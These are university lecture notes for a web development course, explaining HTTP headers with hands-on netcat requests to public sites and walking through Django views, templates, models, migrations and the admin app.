------
The `Accept` request HTTP header advertises which content types, expressed as
MIME types, the client is able to understand.  The last example tells the
server "I will accept all types of content".

	Accept: text/html, text/plain, application/octet-stream
	Accept: image/jpeg, image/png
	Accept: image/*
	Accept: */*


Accept-Encoding
---------------
The `Accept-Encoding` request HTTP header advertises which content encoding,
usually a compression algorithm, the client is able to understand.  Multiple
algorithms are specified, in preference order, separated by commas.

    Accept-Encoding: gzip
    Accept-Encoding: deflate
    Accept-Encoding: br
    Accept-Encoding: gzip, compress, deflate, br
    Accept-Encoding: *


Cookie
------
The `Cookie` HTTP request header contains stored HTTP cookies previously sent by
the server with the Set-Cookie header.

All cookies must be sent as one line of text, with no newline characters.  This
header takes a list of name=value pairs. Pairs in the list are separated by a
semi-colon and a space ('; ').

	Cookie: chocolate=chip; yummy=true; 


Set-Cookie
----------
The `Set-Cookie` HTTP response header is used to send cookies from the server to
the user agent.  An expiration date for this cookie may be specified by the server.

	Set-Cookie: Hungry_For_Apples=no
	Set-Cookie: Whats_Up=My_Glip_Glops; Max-Age: 600
	Set-Cookie: South_Park=Already_Did_It; Date: Wed, 02 Oct 2013 17:01:03 GMT;

The `max-Age` directive is expressed in seconds

The `date` directive is a date FROM THE POINT OF VIEW OF YOUR PC!


Content-Length
--------------
This general header indicates the size, in bytes, of the payload sent to the
recipient.  Non header-only responses from the server will use it to tell the
browser how much data to expect.

When used as a request header it is only meaningful when used in conjunction
with requests that send a payload of data.  These requests include POST, PUT,
and PATCH.  GET requests send only headers, hence this header isn't used then.

The content begins on the line immediately following the `\r\n` blank line
separating the headers from the Payload in a POST req  uest.

    Content-Length: 42
    Content-Length: 1337


*Question:* if GET requests don't tell the server how many bytes to expect, how
does the server know when it has received the entire request from the client?



## Experimenting with headers using `nc` (netcat)

* Linux users likely already have netcat installed.  It may be found by the
  name of `nc`, `ncat` or `netcat`.

* Windows users can download a clone of this program from
  https://joncraton.org/blog/46/netcat-for-windows/.  To extract the zipfile
  use the password "nc".

* I'm not sure about Mac.  Maybe it's in your App store?


You may also use a program called `telnet` to do this, too.  For what we're
doing it behaves as a drop-in replacement for `nc`.  Simply replace `nc` with
`telnet` in the command lines below.

* Linux users: Telnet likely already installed.  If not, netcat is better.

* Windows users: Telnet is already kind-of installed for you, but is disabled
  for "security" reasons.  You'l have to go into the Control Panel and manually
  enable or install it as a "Program and Feature".

* Mac: Let me know if Telnet happens to come pre-installed.  As with Linux,
  netcat is superior.



To run these examples leave off the leading whitspace but otherwise type them
EXACTLY as presented below.  Remember that the line starting with a dollar sign
denotes the command that I typed on my computer; don't copy the dollar sign.
When you type `nc` (or `telnet`) the computer will wait for you to finish
entering your complete request.  Signal that your input is finished by typing
`Return` twice.

After the request is displayed you may not be returned to the command prompt.
When this happens press `Ctrl-C` to exit from `nc`.  If you're using Telnet you
must press `Ctrl-]` and type `quit` at the 'telnet>' prompt.



### Using the `Connection` header

Can you spot the difference between these requests?  What does the `Connection` header do?

    $ nc google.com 80
    GET /search?q=cool+stuff HTTP/1.1


    $ nc google.com 80
    GET /search?q=cool+stuff HTTP/1.1
    Connection: close


    $ nc google.com 80
    GET /search?q=cool+stuff HTTP/1.1
    Connection: keep-alive



### Using the `Accept-Encoding` header

Can you spot the difference from one of the requests above?

    $ nc google.com 80
    GET /search?q=cool+stuff HTTP/1.1
    Accept-Encoding: gzip
    Connection: close


### Visit Google's `teapot` service to see the rare 418 status code

    $ nc google.com 80
    GET /teapot HTTP/1.1
    Connection: close



### A website that responds differently based upon the `Host` header

    $ nc www.ask.com 80
    GET /web?q=cool+stuff&o=0&qo=homepageSearchBox HTTP/1.1
    Connection: close


    $ nc www.ask.com 80
    GET /web?q=cool+stuff&o=0&qo=homepageSearchBox HTTP/1.1
    Host: www.ask.com
    Connection: close



--------------------------------------------------------------------------------
# Static Hosting on Bitbucket

https://confluence.atlassian.com/bitbucket/publishing-a-website-on-bitbucket-cloud-221449776.html

1. Create a new repository named <username>.bitbucket.io
2. Push the index.html and stylesheet to the bitbucket.io repository made in step 1
3. Open the hosted webpage on <username>.bitbucket.io

_Note:_ You will need to manually segregate different webpages into their own separate directories



## Beware of caches!

Bitbucket will cache parts of your statically hosted webpage for performance
reasons.  Other websites employ CDNs to cache parts of websites to improve
delivery speed and to reduce their bandwidth costs


#### Content delivery network (CDN):
A system of distributed servers (network) that deliver pages and other Web
content to a user, based on the geographic locations of the user, the origin of
the webpage and the content delivery server.

https://www.webopedia.com/TERM/C/CDN.html

This will manifest to you when you push an update to Bitbucket but don't see
the changes in your browser when you refresh the page.  In the past it has
taken upwards of half an hour for changes to propagate through the CDN back to
students.




--------------------------------------------------------------------------------
# Getting started with Django

https://bitbucket.org/erikfalor/sp19-cs2610-lecturenotes/src/master/Readings-and-resources.md#markdown-header-creating-your-first-project





Lecture 10: Module2/Jan_30/notes.md
================================================================

# CS2610 - Wed Jan 30 - Module 2

# Announcements


## Free Software and Linux Club - Bash Course Crash Course

Learn how to use the Command Shell

We will be discussing navigation of your shell this week.  We will not try to
overwhelm anyone so it's going to be the basics and will provide everyone with
tools and resources to pursue Shell mastery on their own!

We hope to see everyone there!

Wednesday, January 30th, at 7:00pm in ESLC 053



## BSidesSLC Student Scholarship Program
https://www.bsidesslc.org/scholarship

*Interested students must submit a proposal by Friday, February 1st, 2018*



## Exam 0 is next week

The exam is available at the testing center from Tues Feb 5 - Thurs Feb 7.

The exam will cover all material from the beginning of the semester through
this Friday.

We will have an exam review on Monday to prepare.  The Mastery Quizzes for
Modules 0, 1 and 2 are your best way to review; I'll be updating Module 2's
Mastery Quiz with material from today and Friday's lectures before the exam.




# Topics:

*   Assignment 2: Static(?) Blog in Django
*   Python Intro Course on Canvas
*   The Official Django Tutorial
*   What does Django actually do?
*   Writing a view in Django




--------------------------------------------------------------------------------
# Assignment 2: Static(?) Blog in Django

https://usu.instructure.com/courses/529849/assignments/2581301


--------------------------------------------------------------------------------
# Python Intro Course on Canvas

We'll be doing a fair bit of work in the Python language now that we're using
the Django framework.

If you are new to the Python language or are a bit rusty, you've been invited
to a [Python Intro](https://usu.instructure.com/courses/474722) course on
Canvas.  This course will quickly bring you up to speed with what you need to
know to work in Django.


## TL;DR The most important things to understand about Python right now:

* [Python Numbers](https://usu.instructure.com/courses/474722/pages/numbers)
* [Python Strings](https://usu.instructure.com/courses/474722/pages/strings)
* [Python Lists](https://usu.instructure.com/courses/474722/pages/lists)
* [Python Control Flow](https://usu.instructure.com/courses/474722/pages/control-flow)
* [Writing Python Functions](../Readings-and-resources.md#markdown-header-writing-functions-in-python)



--------------------------------------------------------------------------------
# The Official Django Tutorial

Consider the Django Tutorial to be required reading.  Consider the polls app
that it describes to be a homework assignment.  I will expect you to be
familiar with this tutorial as it answers your most common questions.  When you
ask me or the TA a question, don't be surprised when the answer is "check the
tutorial".

We won't discuss the entirety of the tutorial in class.  I've listed which
sections of the tutorial I expect you to follow on your own.

[Tutorial sections to follow](../Readings-and-resources.md#markdown-header-the-official-django-tutorial)

Tutorial part 1 covers what we did in class on Monday with setting up a Django
project and app, and covers what we will discuss today.



--------------------------------------------------------------------------------
# What does Django do?

While developing your application Django provides you with a web server.  Web
servers communicate with web clients (user agents) using HTTP as the language.

## Static servers

Some web servers (such as Bitbucket.io) respond to HTTP requests by sending
back a file attached to HTTP headers.  Each identical request results in an
identical response.  Static web servers can be thought of as a mapping from
URLs to local files.

    $ nc unnovative.net 80
    GET /level1.html HTTP/1.0

    $ nc google.com 80
    GET /teapot HTTP/1.1


## Dynamic servers

Some web servers (such as Django) respond to HTTP requests by calling on a
function to create a custom response.

    $ nc checkip.dyndns.com 80
    GET / HTTP/1.1


This function's input is the entirety of the HTTP request, including the method
of the request (GET, PUT, POST, DELETE), the URL requested, all of the HTTP
headers as well as any data payload sent by the user agent.

This response can be *anything* that a function can compute from these inputs.
The function could return a hard-coded string, or it might read and return the
contents of a file.  Or, the function could combine the input data in a complex
computation to produce a unique response.



--------------------------------------------------------------------------------
# Writing our first Django views

Let's start small and build a few simple views.

https://docs.djangoproject.com/en/2.1/intro/tutorial01/#write-your-first-view


Clone my code and follow along with what I do in class

    git clone https://bitbucket.org/erikfalor/sp19-cs2610-djangoproj


Lecture 11: Module2/Feb_01/notes.md
================================================================

# CS2610 - Fri Feb 01 - Module 2

# Announcements


## Mastery Quizzes have been updated for Modules 1 & 2

This is in preparation for the upcoming Exam #0, next week from Tues Feb 5 -
Thurs Feb 7.

I will add more questions to M2's MQ based upon how far we make it today.


# Topics:

*   How *NOT* to create dynamic content
*   What is a template in Django?
*   The Django template language
*   What are Context Objects in Django?
*   How to include static content in a Django-generated page
*   Removing hardcoded URLs in templates



----------------------------------------------------------------------------
# How *NOT* to create dynamic content

I worked on webapps a number of years ago, back when Web 2.0 was just getting a
start.  Before I show you the **right** way to create a dynamic website, let's
take a look at how we used to do this so you can more proprely appreciate just
how great Django is.

Let's make two webpages:

1. A chiefly static page with a trivial dynamic element (index.html)
2. Another page including a visit counter


## Follow along with the code I'm writing in class

https://bitbucket.org/erikfalor/sp19-cs2610-djangoproj

This is in the "hello" app.

Well, that seemed unnecessarily difficult.  Let us count the ways those pages
sucked:

1.  Lots of repetition
2.  Mixing two languages in one file, and worse, it's a string literal!
3.  Doesn't scale very well




----------------------------------------------------------------------------
# What is a template in Django?

Basically we want to treat our HTML like a Wacky MadLib (TM) and fill in the
blanks.  A central feature of Django is the template system which lets us do
that, and so much more.


#### Template
Partially-formed webpage file with defined style and layout, containing regions
to be filled in programatically

https://docs.djangoproject.com/en/2.1/intro/tutorial03/#write-views-that-actually-do-something


Let's try this example again, but with templates.



## How Django loads templates

https://docs.djangoproject.com/en/2.1/topics/templates/#template-loading


### Install the template files

Create a subdirectory within your app named templates/, which itself contains
*another* subdirectory named for your app. For example, in my hello app I
create:

    mkdir hello/templates
    mkdir hello/templates/hello

Into this directory I place a template file named `index.html`. This convoluted
scheme is to distinguish a template named `index.html` in my hello app from
another template called `index.html` in a different app.



### "Install" your app into the Django project

When a view asks to render a template Django will look for a directory called
`templates` in every *installed* app within the project.  You might think that
running `python manage.py startapp <APPNAME>` would be enough to install the
app, but it isn't.  We'll just have to do this part ourselves.

Django created many files for you When you started your app with the above
command.  One of the files was called `hello/apps.py`, which contains a Python
class that we must tell the Django project about.  This constitutes
"installing" our app.

These instructions are contained within the Django Tutorial, but I'll list them
here for your convenience as you follow along:

1.  Edit the Django project's `settings.py` file.
2.  Look for a variable named `INSTALLED_APPS`.  It is a Python list, where
    each element is a string giving the Pythonic name of classes corresponding
    to Django apps.
3.  Add to the list the Pythonic name of the class contained `hello/apps.py`.
    In my case, this string is `'hello.apps.HelloConfig'`.  Don't forget to add
    a comma after your string, or else you'll create a syntax error!


If you fail to install your app in this way, Django will fail to locate your
template file and you will see an error page bearing the error
`TemplateDoesNotExist`.



### Render the template in your view function

Next, in my view function, instead of returning an HttpResponse() object
constructed with a string containing HTML content, I call the `render()`
function imported from the  `django.shortcuts` module.

`render()` needs two required arguments and can take a third optional argument.
These are:

1.  The HTTP request object which was passed to our view function
2.  A string naming our template file.  This name is a *relative path* which
    identifies the template under the `hello/templates` directory.  We leave
    out the part of the path containing our Django project, as well as the name
    of the `hello/templates` directory itself.
3.  *Optionally* a "context object" into which we put any variables that the
    template may use to fill-in the blanks.  If we don't pass a context object
    our template is effectively a static web page.


Here is a very minimal example:

    from django.shortcuts import render
    from time import strftime

    def index(request):
        context = { 'now' : strftime('%c')}
        return render(request, 'hello/index.html', context)




--------------------------------------------------------------------------------
# The Django template language

https://docs.djangoproject.com/en/2.1/topics/templates/#the-django-template-language

Templates in Django are a mixture of HTML, CSS, etc. with markup that
Django looks for and acts upon. The Django template language has four
constructs:

### `{{ Variables }}`

A variable outputs a value from the context, which is a dict-like object
mapping keys to values.



### `{% Tags %}`

Tags provide arbitrary logic in the rendering process. This can involve
conditionals (if/else blocks), loops {% for something in something %}, etc.

https://docs.djangoproject.com/en/2.1/ref/templates/builtins/#ref-templates-builtins-tags



### `{{ textVariable | Filters }}`

Filters transform the values of variables and tag arguments.

https://docs.djangoproject.com/en/2.1/ref/templates/builtins/#ref-templates-builtins-filters



### `{# Comments #}`

Prevent text and markup from being rendered (e.g. `{# this won't be rendered #}`)

A `{% comment %}` tag provides multi-line comments.

    {% comment %}

        <!-- WIP: I haven't written the URLConf for 'some-url-name' yet,
        so this tag crashes right now  -->
        {% url 'some-url-name' v1 v2 %}

    {% endcomment %}




----------------------------------------------------------------------------
# What are Context Objects in Django?

The data we send to the template renderer is packaged in a Python dictionary.

[Python Dictionaries](https://usu.instructure.com/courses/474722/pages/dictionaries)

A dictionary is a compound datatype which is used like an array or list but
which uses strings in its subscript instead of integers.

* Lists in Python are constructed with [] 
* Dictionaries in Python are constructed with {}
     

Lists are ordered collections of values. You look up items in a list by their
position. You can meaningfully say "item x is before item y in this list".

Dictionaries, by contrast, are unordered collections of items. There is no
concept of "before" or "after" when it comes to dictionaries. Dictionaries are
key-value pairs.

Therefore, you don't store or retrieve data in a dictionary by referring to its
position. Instead, you give each item a name, and refer to it thus.

A dictionary is denoted with curly braces { }. Keys are separated from values
with a colon :

    sculptors={
            "light_fixtures": "Elsner",
            "concentric_arcs": "Ohran",
            "pivotal_concord": "Deming",
            "french_fries": "Kinnebrew",
            "Tools_of_Ag": ["Cummings","DeGraffenried"],
            "Whispers_and_Silence": "Suzuki",
            "PrincePhraApaimanee": "Kampalanont",
            "BlockA": "Be-No Club"
            }   

    print sculptors['Whispers_and_Silence']



--------------------------------------------------------------------------------
# How to include static content in a Django-generated page

https://docs.djangoproject.com/en/2.1/intro/tutorial06/

Static content (CSS, images, JavaScript files) are to be placed in a
subdirectory named static/ under your app's directory. Just like with your
templates, you should create another subdirectory within static/ that matches
the name of your app.

The URL at which Django will make your static files available will not
necessarily match the directory structure of your webapp, so it won't be wise
for you to try to hardcode the URL to these resources into your template.

Rather, you will use the {% static %} tag to instruct the template renderer to
create the correct URL for you. While this does feel extraordinarily
complicated at first, it does give you the flexibility to later on move or
rename your app with a minimum of fuss.

Remember to use the {% load static %} tag the top of your template to enable
the {% static %} tag.


Example:

    {% load static %}
    <html>
        <head>
            <title>How I shall take over the world</title>
            <link rel="stylesheet" href="{% static 'hello/style.css' %}" />




----------------------------------------------------------------------------
# Removing hardcoded URLs in templates

[Removing hardcoded URLs in templates](https://docs.djangoproject.com/en/2.1/intro/tutorial03/#removing-hardcoded-urls-in-templates)

Instead of writing a hardcoded URL which will suffer from the same drawbacks
as a hardcoded absolute URL in a plain HTML file, we can get Django to write
the correct URL for us.  Use the `{% url %}` template tag to map the name of a
view function to a URL the browser can follow.  Then our template will always
work even if we change the mapping of URLs to view functions in the Controller.



Lecture 12: Module2/Feb_04/notes.md
================================================================

# CS2610 - Mon Feb 04 - Module 2


# Announcements


## SDL/USU Technical Lecture - Engineering: Finding the Great Parts of the Grind
Tom Russell, EE - SDL

Please join us for the next SDL/USU Technical Lecture Series at 4:30 pm on
Tuesday, February. 5 in ENGR 201. Free pizza after lecture. 



## AIS - Real World Cyber Security

Tuesday Feb 5 6pm - 7pm
Huntsman Hall 322

Jon Parker, IT Director  of Enterprise Info Management, Melaleuca
Josh Rolfe, IT Senior Manager of Sec Ops, Melaleuca



## FSLC Meeting

The Vim vs. Emacs Showdown!!!
Wednesday Feb 6
7pm - ESLC 053



## DC435 Meetup - Packet Capture Games

Have you ever wanted to know what your ISP can see about you? What about your
employer? Or someone else on your hotel wifi with you?

Come learn about network packets and play some **Wireshark** packet capture games

https://dc435.org/blog/2016-12-17-making-sense-of-the-scaas-new-flavor-wheel/

Thursday, Feb 7th 7pm
B Tech West Campus - 1410 North 1000 West




## Django version 2.2 is coming out soon

As you're following the tutorial, be sure that you're reading the documentation
for Django version 2.1.  The tutorial for version 2.2 is now available.

According to their release schedule, the next version of Django will be coming
out late in this semester.

https://www.djangoproject.com/weblog/2019/jan/17/django-22-alpha-1/

My plan is to stick with version 2.1 throughout the entire semester.


You can check which version of Django you have installed with this command:

    python -m django --version



--------------------------------------------------------------------------------
# Exam 0 Review


We'll review by doing Exam Review Speed Dating

Face the row opposite you.  Students on the row facing the screen will be the
"novices" who have lots of questions.  Students facing away from the screen are
the "experts" who have all of the answers.

Take a few minutes to ask and answer the listed questions.  Then we'll switch
sides and do it all again.

Ready?





## Git

* What is a git repository?
    It's a folder that contains the "magical" .git folder

* What is the fundamental unit of history in the git log?
    commit

* Who created The Git Version Control System?
    Linus Torvalds (the dude who made Linux)

* How do I
    * list the commit history of a repo?
        git log

    * send commits from your local repository to a remote repository?     
        git push

    * select the files that should be included in a new commit?     
        git add

    * permanently records the staged changes into the repository?     
        git commit  / git commit -m ""

    * create a brand-new repository from scratch?
        git init
        
    * see which files have been changed in the working tree since the last commit?
        git status

    * set up a new remote repository
        git remote

    * set configuration options (for instance, your name and email address)?
        git config



## HTML - Hyper Text Markup Language

* Explain the purpose and proper use of HTML elements
    * head   - for the brower's use, contains metadata
    * body   - contains the page's content
    * title
    * p      - block-level, free-flowing text (the spaces are squashed)
    * pre    - block-level, formatted text (the spaces are preserved)
    * a      - hyperlink 
    * img    -
    * div   - block-level
    * span  - inline
    * ol, ul, li
    * table, tr, td

* Inline vs. block-level elements
    Block-level takes up the width of its container
    Inline doesn't take up more width than it needs

* Identify a correct HTML5 DOCTYPE declaration
    <!DOCTYPE html>

* Recognize the structure of a correct HTML5 document

* What data structure does an HTML document describe?
    A tree


## Cascading Style Sheets - CSS

* What problem does CSS aim to solve?
    modularity - 1 style sheet for all of my pages
    reuse code across pages, across websites
    Don't need to re-structure the tree to change appearance


* Why is it called "Cascading" Style Sheets?
    When I have two or more conflicting rules that apply to the same element,
    the "cascade" algorithm decides which rule applies (tie-breaking)
    The most specific rule wins, then ties are broken by "last-seen-wins"


* Basic Selectors - what do they look like, and what do they select?
    <p class="one two" id="Joey"> this is some text </p>
    <p class="one " id="Adam">This paragraph doesn't match .one.two</p>

    * element
        p

    * class
        .two
        .one.two /* logical AND */

    * ID
        #Joey


* Composite Selectors
    * What does a comma mean in a selector?
        .one, .two /* logical OR */

    * Write a selector matching elements participating in a descendant relationship
        div p

    * Write a selector matching chilren participating in a parent -> child relationship
        ol > li



## Django

* What is a Django Project?

* What is a Django App?

* How do I create a new Django project?

* Which Django (manage.py) command do I use to...
    * Create a new Django application?
    * Add a superuser account to my project?
    * Update my database schema? (2 commands)
    * Launch an interactive shell w/ Django system loaded?
    * Run a server in my project?


*   Which Django file is responsible for...
    * The code which runs when a user wants to see a page? (VIEW)
        views.py
    * Mapping a URL to a view function? (CONTROLLER, aka receptionist)
        urls.py
    * Containing configuration information for my project?
        settings.py


*   Django templates
    *   What function do I call to render a template?
        render()
    *   What is a Django context object?
        a Python dictionary
    *   What type of Django template entity is surrounded by double curly braces {{ }}?
        variable
    *   What type of Django template entity is curly braces like this: {% %}?
        template tag


Lecture 13: Module3/Feb_06/notes.md
================================================================

# CS2610 - Wed Feb 06 - Module 3

# Announcements


## FSLC Meeting

The Vim vs. Emacs Showdown!!!
Wednesday Feb 6
7pm - ESLC 053



## DC435 Meetup - Packet Capture Games

Have you ever wanted to know what your ISP can see about you? What about your
employer? Or someone else on your hotel wifi with you?

Come learn about network packets and play some **Wireshark** packet capture games

https://dc435.org/blog/2016-12-17-making-sense-of-the-scaas-new-flavor-wheel/

Thursday, Feb 7th 7pm
BTech West Campus - 1410 North 1000 West




# Topics:

* Introduce Assignment 3: Dynamic Blog in Django With The ORM
* What is "database schema"?
* Activity: Design your blog app's schema
* Django Database Integration




----------------------------------------------------------------------------
# Introduce Assignment 3: Dynamic Blog in Django With The ORM

[Assn3](https://usu.instructure.com/courses/529849/modules/items/3366237)


## What is the problem that you have been asked to solve?

(mudcard)



----------------------------------------------------------------------------
# What is "database schema"?

Remember that time I made a visitor counter using a global variable?  There had
to be a better way than that, right?  There is.

Databases.


Consider an object-oriented application that stores blog posts and comments on
those posts.

* What objects will your system include?
* How will the objects relate to one another?
* What pieces of data will you store in each object?




#### Schema: The organization of data as a blueprint of how the database is constructed 


When desiging a database we want to follow organizational principles that are
similar to the way we organize object-oriented code.


#### Classes : Object :: Table : Rows

Code is organized into classes with data members
Databases are organized into tables with columns

The concepts of classes and tables are virtually the same, so much so that
nearly every programming interface to a database represents database tables as
classes, and rows of data in a database as instances (a.k.a. objects).


----------------------------------------------------------------------------
# Activity: Design your blog app's schema

(mudcard)

1. List the items of data that your blog app will need to capture.
2. Organize them into categories (OOP classes)
3. Draw the relationships between the classes

You should keep this diagram if it is helpful to you.

For participation purposes, put your name and/or A number on a sticky note.



----------------------------------------------------------------------------
# Django Database Integration


The piece of software which is a bridge between a database system and an
object-oriented programming language is called an Object Relational Mapper.

## Object Relational Mapper (ORM)

https://en.wikipedia.org/wiki/Object-relational_mapping


Learning how to interact with the database through Django is learning to use its ORM.

An ORM gives us many benefits:

* I don't have to learn/write/read SQL
* I'm isolated from the various platform-specific SQL idiosyncrasies
* I get to treat my DB as if it's a collection of objects - within an OOP
  language, this is snazzy


## Models in Django

At this point I shall encourage you to go through the Django tutorial from the
beginning, not just reading, but actually building the Polls app described
therein.  It won't take you very long to build it, and will introduce you to
many useful concepts and techniques that I will expect you to understand.

https://docs.djangoproject.com/en/2.1/intro/tutorial02/

Additionally, the MDN has a similar Django tutorial for building a slightly
more sophisticated app that you may find to be helpful to follow:

https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django


A model in Django is a class which inherits from models.Model.  Its data
members correspond to the columns contained within.



## Data types in our database

A database naturally wants to impose certain datatypes on each of its columns;
if a column is declared to hold character data it is an error to introduce
textual data.  This will feel familiar if you're coming from C++ or Java,
however databases tend to take it even further, specifying that character data
(strings) be no longer than some maximum length.

Naturally, this poses a difficulty for a dynamically-typed language such as
Python which does not ordinarily impose this restriction on its variables.

We can work around this limitation by creating values that are a special kind
of object created by the Django folks.  When we try to assign a value into one
of these special Django fields (using something like a setter function), code
is run which ensures that the incoming value matches the expected type.

Django ships with dozens of built-in field types; here is the complete list:

https://docs.djangoproject.com/en/2.1/ref/models/fields/#model-field-types


Lecture 14: Module3/Feb_08/notes.md
================================================================

# CS2610 - Fri Feb 08 - Module 3

# Announcements

## Assignment 2 Effort Survey

This optional survey will help me develop better homework assignments.
Your participation is not required and all responses are anonymous.

https://usu.instructure.com/courses/529849/quizzes/714282



## AIS Security SIG meeting

Military Intelligence personnel will present on "Social Engineering" and
Interrogation.

6pm Tuesday Feb 12 
Huntsman Hall 326




# Topics:
* Exam 0 Recap
* What's the difference between an *app* and a *project*?
* Django Migrations

----------------------------------------------------------------------------
# Exam 0 Recap


__Question 22__ (66% answered correctly)
* Q:    What will the selector body, div, p select?
* A:    All body, div, and p elements in the document


__Question 23__ (82% answered correctly)
* Q:    What will the selector div.alert select
* A:    All div elements which contain alert in their class list


__Question 27__ (40% answered correctly)

* Q:    In Django, the controller is
* A:    A Python list named urlpatterns which maps URLs to views


__Question 28__ (77% answered correctly)

* Q:    In Django, a view is
* A:    A Python function which takes an HTTP Request as input and returns an HTTP Response


----------------------------------------------------------------------------
# What's the difference between an *app* and a *project*?

A project consists of apps, and an app consists of views.

* Project
    + The code which ```django-admin``` creates for you in your project
      directory
    + *Infrastructure*: Python code which makes Django act as an HTTP server
      which can process HTTP inputs and outputs; routes HTTP requests to your
      view functions based upon the URL given, etc.
    + A container for apps
    + *Configuration*: helpful Python code provided by the Django folks which
      enables your app to run on different web servers with different database
      engines.  This lets you focus on my own project, freeing you from
      "re-inventing wheels".
    + The project stays "behind the scenes"; users are unaware of its presence


* Application
    + The code you actually want to write, the fun stuff that users will see,
      interact with, and enjoy
    + Made of views (a.k.a. pages) which are unified in purpose


As an example, consider two Google products you're likely familiar with: Google
Docs and Gmail.  Each of these on their own would be an example of an *app*.
One is an application providing word processing and spreadsheet functionality
to users.  The other is an application used for communicating via the Internet
Electronic Mail protcol.

While a Google document can be shared via Gmail, and the content of emails
could be stored as documents, these applications really serve two different
purposes.  It makes sense from a software engineering point of view to have
different teams working on differet applications which serve different
purposes.

To give you a sense of how Django is used in the real world, you can find a list of sites using Django at the bottom of the Django project's [Overview page](https://www.djangoproject.com/start/overview/)

This page purports to be a list of [14 Popular Sites Powered by Django Web Framework](https://codecondo.com/popular-websites-django/)



----------------------------------------------------------------------------
# Django Migrations

As your app evolves your model will change.  This means that the objects in
your code will change over time, as well as the data on disk in the database.
Django's "migrations" allow existing data to "follow along" with your code
changes.  We won't delve too deeply into what migrations are or how they work;
it suffices to understand that Django can tell when we change the schema of our
database and we'll have to manually run a couple of commands to get Django to
quiet down about it.


Today we'll finally get rid of Django's red warning about "You have 15
unapplied migration(s)." whenever you run the server.




#### $ python manage.py migrate

Run the migration code in any apps which have unapplied changes.  This will
create a database file if there is none, and update any existing data according
to the instructions in the migration.

How do you create the "instructions in the migration"? 
You don't.  Django writes them for you ;)


#### $ python manage.py makemigrations

Django will read through the models.py files of your INSTALLED_APPS[], detect
any changes, and write the migration instructions for you.  Then, you may run
the previous command to make the changes stick.

Any time we make changes to our models (classes inside our app's `models.py`
file), we'll need to re-run this command in order for the changes to take
effect.

Your workflow will thus be:

1.  Add the name of our app's configuration object to the project's
    `settings.py` file (do this only once)
2.  Edit `models.py`
3.  Run `python manage.py makemigrations`
4.  Run `python manage.py migrate`





Lecture 15: Module3/Feb_11/notes.md
================================================================

# CS2610 - Mon Feb 11 - Module 3

# Announcements



## AIS Security SIG meeting

Military Intelligence personnel will present on "Social Engineering" and
Interrogation.

6pm Tuesday Feb 12 
Huntsman Hall 326




# Topics:
* Finish the highFive demo
* Explore the Django database API in the REPL
* A deeper dive into database organization
* What is the Admin app, and how do I use it?



--------------------------------------------------------------------------------
# Finish the highFive demo

Get the code on bitbucket now


--------------------------------------------------------------------------------
# Explore the Django database API in the REPL

At this point you are able to go through the tutorial, in order, from start to
finish (skipping over those sections listed as unnecessary in the R&R).  Don't
neglect to do this as it is the best way to come up to speed on Django!


Today we will explore the Django database API in the REPL by

* Creating database row objects
* Saving them to the DB
* Retrieving them from the DB again
* Overriding Python's ToString() equivalent (the __str__() method) to give each
  row in our Database a pleasant string representation.

https://docs.djangoproject.com/en/2.1/intro/tutorial02/#playing-with-the-api


Key observations:
-----------------

* You must run ```./manage.py makemigrations APP_NAME``` and then
  ```./manage.py migrate``` before you can begin to use the database.

* The models we're using in our Blog app (Blog and Comment) have a lot of
  functionality given to us for free by virtue of the fact that they inherit
  from django's models.Model class.

* New rows in the database are created by saving the result of a call to the
  Model constructor. In the case of our blog app, the call

    Blog(title="What's new?", pub_date=timezone.now())

  creates a row object. We should save that object into a variable so we can
  later call the save() method on it to write it down into the DB:
      
    b = Blog(title="What's new?", pub_date=timezone.now())

* The database isn't actually changed until we call the `save()` method on an object:

    b.save()

* The validity of the data isn't tested/enforced until we attempt to save it.
  Become familiar with what the error trace looks like when this happens, as it
  may happen often during development ;)

* The primary key field called "id" isn't assigned until we call the `save()`
  method.

* If we go out of our way to manually set the `id` field, calling save() will
  overwrite the existing row. Otherwise, `save()` adds a new row to the DB.


### Django provides a rich database lookup API that's entirely driven by keyword arguments

[How do I do database queries in Django without SQL?](../Readings-and-resources.md#markdown-header-how-do-i-do-database-queries-in-django-without-sql)



----------------------------------------------------------------------------
# A deeper dive into database organization

* What is significant about primary keys?
* Why is the type and size of fields significant to the database system?
* What happens to a child record when its parent is deleted?
* Are primary keys reused after deletion?


polls_app_schema.ods




----------------------------------------------------------------------------
# What is the Admin app, and how do I use it?

https://docs.djangoproject.com/en/2.1/intro/tutorial02/#explore-the-free-admin-functionality

Yay! More free stuff from the Django framework! An entire web application
devoted to making managing your databas models easy.

Let's face it, you're not going to maintain your database by running the Django
REPL directly.

You can reach the admin app by visiting the /admin path of your app:
    http://127.0.0.1:8000/admin

You may have noticed that in your project's urls.py file

It's installed by default in your project's settings.py file, in the INSTALLED_APPS list.


### How do I use the admin app?

Let's visit your admin app by running Django and visiting http://localhost/admin

Oh, what's the password?

Wait, what's my username?



#### Create an administrator account

    $ python manage.py createsuperuser



#### Make your models editable in the admin

Register your models with the admin app by 

1. Editing blog/admin.py 
2. Importing your models
3. Registering each model with `admin.site.register(Blog)`
 
Did you notice how the admin site uses your `__str__()` methods from your models?


Lecture 16: Module3/Feb_13/notes.md
================================================================

# CS2610 - Wed Feb 13 - Module 3

# Announcements



## FSLC 90's Hacker Movie Night

It is roughly that time for mid-terms and we thought since many of you have
either taken your tests or studying your hearts out we should have a chill
night tonight. We are looking at watching a cheesy 90s movie called *Johnny
Mnemonic*: a Keanu Reeves action movie that has VR, Brain implants, and more!
Here is the trailer: https://www.youtube.com/watch?v=U_8BVWHSU_o

Tonight at 7pm in room 053 in the ESLC.


## Lucid Code Kerfuffle | Coding Competition for Prizes Totaling $50k

Free to enter
Saturday, March 9th 10am - 1pm
Register and fight online: https://codekerfuffle.com/
Requires a HackerRank account

Top 32 performers win $500 and an invitation to the on-site championship


# Topics:
* Clean up the testing database
* Initialize a testing database
* Template Filters



----------------------------------------------------------------------------
# Clean up the testing database

The next assignment requires that you create a couple of views which help the
grader manipulate your database; one view clears out the database, and the
other populates the database.

Now that we've created some junk data in the Django shell and Admin app, let's
clear it out so we can start afresh.  We'll create a new Django view to do this
so as to provide a more convenient user interface than the Django shell.


### Mudcard questions

On your mudcards, take a moment to answer the following questions:

* How might we find out how to delete a single record from the database?

* How might we go about deleting everything in the database?

* What's up with that `on_delete=models.CASCADE` thing in the model?

* After we've deleted all records and are left with an empty database, what's
  the value of the ID field of the next record we create?  Does it start over
  again at 1?


When you have designed the code to do this, you may put it into a view that is
activated when the `/nuke` address is visited.  This will free the user (i.e.
the graders) from needing to fire up an extra Django console to reset your
database while grading your assignments.


